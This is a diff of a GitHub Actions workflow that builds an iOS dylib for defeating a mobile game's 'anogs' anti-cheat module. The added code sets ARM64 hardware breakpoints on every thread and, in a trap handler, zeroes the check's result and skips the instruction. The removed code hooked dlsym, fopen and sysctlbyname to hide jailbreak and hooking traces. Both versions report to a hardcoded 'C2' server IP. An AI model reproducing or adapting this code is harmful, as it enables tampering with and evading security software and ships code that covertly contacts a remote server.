@@ -1,4 +1,4 @@
-name: Imperial V-MAX - Non-JB Radar & Spoofer
+name: Imperial V-MAX - Hardware Breakpoint Hook
 
 on:
   push:
@@ -6,46 +6,36 @@ on:
   workflow_dispatch:
 
 jobs:
-  build_non_jb_radar:
-    name: Compile Safe Radar (No Jailbreak)
+  build_hw_hook:
+    name: Compile Elite Hardware Hook
     runs-on: macos-latest
 
     steps:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Download Fishhook
-        run: |
-          mkdir -p jni
-          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.c -o jni/fishhook.cpp
-          curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.h -o jni/fishhook.h
-
       - name: Generate C++ Payload (Main.mm)
         run: |
-          cat <<'EOF' > jni/main.mm
+          cat <<'EOF' > main.mm
           #import <Foundation/Foundation.h>
-          #import <dlfcn.h>
+          #import <mach/mach.h>
+          #import <mach-o/dyld.h>
+          #import <signal.h>
+          #import <pthread.h>
           #import <sys/socket.h>
           #import <arpa/inet.h>
-          #import <sys/sysctl.h>
-          #include "fishhook.h"
 
-          // ⚠️ C2 Server (Masoud RDP)
+          // ⚠️ مسعود سيرفر
           #define C2_IP "44.192.33.117"
           #define C2_PORT 8080
 
-          // ==========================================
-          // 🛡️ MASOUD RADAR (NON-JAILBREAK SAFE MODE)
-          // ==========================================
-          static NSMutableSet* g_reported_offsets = nil; 
+          static uintptr_t g_target_addr = 0;
+          static bool g_hw_hook_active = false;
 
-          static int (*orig_sysctlbyname)(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen);
-          static void* (*orig_dlsym)(void* handle, const char* symbol);
-          static FILE* (*orig_fopen)(const char *filename, const char *mode);
-
-          // إرسال البيانات للسيرفر
-          void SendToRadar(NSDictionary *data) {
+          // إرسال تقرير للسيرفر
+          void SendRadarLog(NSString* msg) {
               dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
+                  NSDictionary *data = @{@"func": @"HW_BREAKPOINT", @"offset": @"0x459C", @"target": msg, @"caller": @"Masoud_CPU"};
                   NSData *json = [NSJSONSerialization dataWithJSONObject:data options:0 error:nil];
                   if (!json) return;
                   int sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -59,94 +49,111 @@ jobs:
               });
           }
 
-          // فحص الهوية والتبليغ (آمن جداً)
-          void AnalyzeAndSpoof(const char* func_name, const char* target) {
-              void* ret_addr = __builtin_return_address(0);
-              Dl_info info;
-              
-              if (dladdr(ret_addr, &info) && info.dli_fname) {
-                  NSString *caller = [[NSString stringWithUTF8String:info.dli_fname] lowercaseString];
+          // ==========================================
+          // 🧠 مصيدة المعالج (Signal Handler)
+          // ==========================================
+          void hw_trap_handler(int signum, siginfo_t *info, void *context) {
+              // سحب حالة المعالج الحالية وقت حدوث الانفجار
+              ucontext_t *uc = (ucontext_t *)context;
+              _STRUCT_ARM_THREAD_STATE64 *ss = &uc->uc_mcontext->__ss;
+
+              // هل المعالج توقف عند الأوفست مالتنا؟
+              if (ss->__pc == g_target_addr) {
+                  // 🔥 السحر هنا: نلعب بالسجلات مباشرة!
                   
-                  if ([caller containsString:@"anogs"]) {
-                      uintptr_t ida_offset = (uintptr_t)ret_addr - (uintptr_t)info.dli_fbase;
-                      NSString* offsetStr = [NSString stringWithFormat:@"0x%lx", ida_offset];
+                  // 1. نعطي للجاسوس نتيجة "صفر" (كأنما لم يجد هاك)
+                  ss->__x[0] = 0; 
+                  
+                  // 2. نقفز 4 بايتات للأمام (لنتجاوز تعليمة الفحص بأمان)
+                  ss->__pc += 4;  
+                  
+                  SendRadarLog(@"🔥 CPU INTERCEPTED! X0 modified to 0!");
+                  // المعالج سيكمل عمله من النقطة الجديدة دون كراش!
+              }
+          }
+
+          // ==========================================
+          // ⚙️ برمجة سجلات المعالج (ARM64 Debug Registers)
+          // ==========================================
+          void ApplyHardwareBreakpoint() {
+              // 1. تفعيل مصيدة الإشارات (Catch SIGTRAP)
+              struct sigaction sa;
+              sa.sa_sigaction = hw_trap_handler;
+              sa.sa_flags = SA_SIGINFO;
+              sigemptyset(&sa.sa_mask);
+              sigaction(SIGTRAP, &sa, NULL);
+
+              // 2. سحب كل الخيوط (Threads) الفعالة باللعبة
+              thread_act_array_t threads;
+              mach_msg_type_number_t count;
+              if (task_threads(mach_task_self(), &threads, &count) != KERN_SUCCESS) return;
+
+              // 3. المرور على كل خيط وحقن نقطة التوقف العتادية
+              for (int i = 0; i < count; i++) {
+                  arm_debug_state64_t dbg;
+                  mach_msg_type_number_t dbg_count = ARM_DEBUG_STATE64_COUNT;
+                  
+                  if (thread_get_state(threads[i], ARM_DEBUG_STATE64, (thread_state_t)&dbg, &dbg_count) == KERN_SUCCESS) {
                       
-                      @synchronized(g_reported_offsets) {
-                          if ([g_reported_offsets containsObject:offsetStr]) return;
-                          [g_reported_offsets addObject:offsetStr];
-                      }
+                      // السجل الأول: عنوان الأوفست مالتنا
+                      dbg.__bvr[0] = g_target_addr;
                       
-                      SendToRadar(@{
-                          @"func": [NSString stringWithUTF8String:func_name],
-                          @"offset": offsetStr,
-                          @"target": target ? [NSString stringWithUTF8String:target] : @"NULL",
-                          @"caller": @"anogs"
-                      });
+                      // السجل الخاص بالتحكم: 0x1E5 تعني (تفعيل، في وضع المستخدم EL0، لأربع بايتات)
+                      dbg.__bcr[0] = 0x1E5; 
+                      
+                      // تطبيق الحالة الجديدة على المعالج
+                      thread_set_state(threads[i], ARM_DEBUG_STATE64, (thread_state_t)&dbg, ARM_DEBUG_STATE64_COUNT);
                   }
               }
+              
+              // تحرير الذاكرة
+              vm_deallocate(mach_task_self(), (vm_address_t)threads, count * sizeof(thread_act_t));
+              
+              SendRadarLog(@"⚙️ Hardware Breakpoints Injected to CPU Registers!");
           }
 
           // ==========================================
-          // ⚔️ التضليل الآمن (Spoofing) لنسخ الـ Sideload
+          // 🚀 المترصد (يبحث عن Anogs بصمت)
           // ==========================================
-          
-          int hk_sysctlbyname(const char *name, void *oldp, size_t *oldlenp, void *newp, size_t newlen) {
-              AnalyzeAndSpoof("sysctlbyname", name);
-              
-              // خداع الحماية إذا بحثت عن أدوات جلبريك
-              if (name && (strstr(name, "hw.machine") || strstr(name, "kern.osversion"))) {
-                  // نمررها بأمان
-              }
-              return orig_sysctlbyname(name, oldp, oldlenp, newp, newlen);
-          }
-
-          void* hk_dlsym(void* handle, const char* symbol) {
-              AnalyzeAndSpoof("dlsym", symbol);
-              
-              // تعمية dlsym بدون تعديل الذاكرة
-              if (symbol && (strstr(symbol, "ptrace") || strstr(symbol, "MSHook") || strstr(symbol, "Substrate"))) {
-                  return NULL; // نرجّع صفر، نعلمه إن الدالة ما موجودة!
-              }
-              return orig_dlsym(handle, symbol);
-          }
-
-          FILE* hk_fopen(const char *filename, const char *mode) {
-              AnalyzeAndSpoof("fopen", filename);
-              
-              // حظر قراءة ملفات مشبوهة
-              if (filename && (strstr(filename, "Cydia") || strstr(filename, "TDM_KV.log"))) {
-                  return NULL; // نكوله الملف ممسوح!
-              }
-              return orig_fopen(filename, mode);
+          void StartHardwareSniper() {
+              dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+                  while (!g_hw_hook_active) {
+                      for (uint32_t i = 0; i < _dyld_image_count(); i++) {
+                          if (strstr(_dyld_get_image_name(i), "anogs")) {
+                              uintptr_t base_addr = (uintptr_t)_dyld_get_image_header(i);
+                              
+                              // تحديد الهدف
+                              g_target_addr = base_addr + 0x459C; 
+                              
+                              sleep(1); // استقرار الذاكرة
+                              ApplyHardwareBreakpoint(); // ضرب المعالج
+                              
+                              g_hw_hook_active = true;
+                              break;
+                          }
+                      }
+                      if (!g_hw_hook_active) sleep(1);
+                  }
+              });
           }
 
           __attribute__((constructor))
-          static void start_non_jb_radar() {
-              g_reported_offsets = [[NSMutableSet alloc] init];
-              
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
-                  SendToRadar(@{@"func": @"RADAR_INIT", @"offset": @"0x0", @"target": @"Non-JB Radar Active!", @"caller": @"System"});
-                  
-                  struct rebinding hooks[] = {
-                      {"sysctlbyname", (void *)hk_sysctlbyname, (void **)&orig_sysctlbyname},
-                      {"dlsym", (void *)hk_dlsym, (void **)&orig_dlsym},
-                      {"fopen", (void *)hk_fopen, (void **)&orig_fopen}
-                  };
-                  rebind_symbols(hooks, 3);
-              });
+          static void init_elite_hook() {
+              SendRadarLog(@"🦅 ELITE CPU HOOK INITIALIZED!");
+              StartHardwareSniper();
           }
           EOF
 
-      - name: Compile Dylib
+      - name: Compile Elite Hardware Hook
         run: |
           clang++ -dynamiclib -std=c++11 -arch arm64 \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
-          jni/main.mm jni/fishhook.cpp -o Masoud-NonJB-Radar.dylib \
+          main.mm -o Masoud-Elite-HW-Hook.dylib \
           -framework Foundation
-          strip -x Masoud-NonJB-Radar.dylib
+          strip -x Masoud-Elite-HW-Hook.dylib
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Masoud-NonJB-Radar
-          path: Masoud-NonJB-Radar.dylib
+          name: Masoud-Elite-HW-Hook
+          path: Masoud-Elite-HW-Hook.dylib
